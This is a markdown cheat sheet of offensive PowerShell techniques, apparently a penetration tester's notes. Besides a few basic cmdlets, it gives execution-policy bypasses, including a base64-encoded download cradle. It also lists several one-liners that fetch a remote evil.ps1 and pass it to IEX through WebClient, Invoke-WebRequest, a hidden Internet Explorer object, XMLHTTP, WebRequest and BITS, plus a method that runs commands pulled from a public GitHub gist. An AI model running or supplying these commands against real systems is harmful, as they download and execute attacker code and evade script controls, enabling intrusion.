## Loading powershell module via dot sourcing
```
. .\PowerView.ps1 # dot sourcing on current directory
```
## Powershell basic cmdlets and help system
```
Get-Command -CommandType cmdlet # Lists all available cmdlets
Get-Help <cmdlet> # Display usage about a cmdlet
Get-Help <cmdlet> -Examples # Display example usage about a cmdlet
```
### Note: 
It is concluded that, use a single quote only to print the plain text but to 
print variables and evaluating other expressions in the string, use the double 
quote in PowerShell.

## Powershell bypass Execution policy

The execution policy is safety feature that controls the conditions under which PowerShell 
loads configuration files and runs scripts. Here are sereral ways of bypassing.

```
powershell -ExecutionPolicy Bypass
powershell -ep bypass
powershell -c <command>
------------------------------------------------------------------------------------------
$string = 'IEX(New-Object Net.WebClient).DownloadString("http://192.168.100.71/test.bat")'
$encodedcommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($string)) 
powershell -EncodedCommand $encodedCommand
------------------------------------------------------------------------------------------
$env:PSExecutionPolicyPreference="Bypass"
```

## Importing Modules

```
Import-Module <module-path>
```

## LIsting all commands in a module
```
Get-Command -Module <module-name>
```
## Download and execute files using powershell

```
IEX (New-Object Net.Webclient).downloadstring("http://webserver.com/evil.ps1")

IEX (iwr 'http://webserver.com/evil.ps1')

$ie=New-Object -comobject InternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://EVIL/evil.ps1');start-sleep -s 5;$r=$ie.Document.body.innerHTML;$ie.quit();IEX $r # Uses internet explorer and prompts the user to download or save the file

$h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://webserver.com/evil.ps1',$false);$h.send();iex $h.responseText

$wr=[System.NET.WebRequest]::Create("http://192.168.100.71:8000/hehe.ps1");$r=$wr.GetResponse();IEX([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()

Import-Module bitstransfer;Start-BitsTransfer 'http://webserver.com/evil.ps1' $env:temp\t;$r=gc $env:temp\t;rm $env:temp\t; iex $r

```
## Download and Execute using gist

First create a public gist with anything.txt as follows, enter the desired command inside <execute></execute>.

```
<?xml version="1.0"?>
<command>
   <a>
      <execute>Get-Process</execute>
   </a>
</command>

```
Then, 
```
$a = New-Object System.Xml.XmlDocument;$a.Load("https://gist.githubusercontent.com/alexdhital/d2e1627948dd1d997e614f1cfd95a75d/raw/398b4adde13b271757364825a644846865a1089f/hehe.txt");$a.command.a.execute | iex
```

